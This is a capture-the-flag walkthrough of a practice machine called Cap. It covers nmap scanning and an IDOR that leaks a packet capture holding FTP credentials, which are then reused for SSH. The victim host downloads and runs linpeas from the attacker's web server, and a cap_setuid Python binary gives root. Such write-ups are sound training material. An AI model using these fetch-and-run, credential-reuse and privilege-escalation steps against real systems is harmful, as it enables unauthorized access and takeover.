---
description: 10.10.10.245
---

# Cap

Tags
* ftp
* pcap
* capabilities

<!--

Required tools
* nmap
* wireshark/tcpdump/tshark

Other commands/tools
```
ftp/ncftp/lftp
```

-->

## Walkthrough

* [IppSec](https://www.youtube.com/watch?v=O_z6o2xuvlw) (video)

### Enumeration

Nmap
```bash
nmap -sC -sV -oA nmap.out 10.10.10.245

# output
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 09 May 2023 21:30:28 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 09 May 2023 21:30:23 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 09 May 2023 21:30:23 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-title: Security Dashboard
```

Look for vulnerabilities: none
```bash
searchsploit vsftpd

# output
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote M | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Deni | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Deni | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service              | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service       | multiple/remote/49719.py
```

Manually fuzz pages: Insecure Direct Object Reference (IDOR)
```bash
# http://10.10.10.245/data/0
wget -O download-0.pcap http://10.10.10.245/download/0

# analyze pcap
wireshark download-0.pcap
tcpdump -r download-0.pcap

tshark -r download-0.pcap -Y ftp
Running as user "root" and group "root". This could be dangerous.
   34   2.626895 192.168.196.16 → 192.168.196.1 FTP 76 Response: 220 (vsFTPd 3.0.3)
   36   4.126500 192.168.196.1 → 192.168.196.16 FTP 69 Request: USER nathan
   38   4.126630 192.168.196.16 → 192.168.196.1 FTP 90 Response: 331 Please specify the password.
   40   5.424998 192.168.196.1 → 192.168.196.16 FTP 78 Request: PASS Buck3tH4TF0RM3!
   42   5.432387 192.168.196.16 → 192.168.196.1 FTP 79 Response: 230 Login successful.
```

Access FTP server
```bash
# ftp clients
apt install ftp ncftp lftp

# login
ncftp -P 21 -u nathan -p Buck3tH4TF0RM3! 10.10.10.245
lftp -u nathan,Buck3tH4TF0RM3! -p 21 10.10.10.245

# same ssh credentials
ssh -o StrictHostKeyChecking=no nathan@10.10.10.245

# flag
cat /home/nathan/user.txt
```

### Privilege Escalation

Upload privesc script
```bash
# [attacker] download and expose script
mkdir -p /share/www && \
  curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh &&
  python3 -m http.server -d /share/www

# [victim] use tun0 <IP_ADDRESS> of attacker
curl -o /dev/shm/linpeas.sh 10.10.14.14:8000/linpeas.sh
bash /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt

scp nathan@10.10.10.245:/dev/shm/linpeas.txt .
less -r linpeas.txt

# output
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`CAP_SETUID` allows the process to gain setuid privileges without the SUID bit set

* [capabilities - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)

```python
# nathan@cap:~$ python3

Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('id')
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
>>> os.setuid(0)
>>> os.system('id')
uid=0(root) gid=1001(nathan) groups=1001(nathan)
>>> os.system('sh')

# flag
# cat /root/root.txt
```
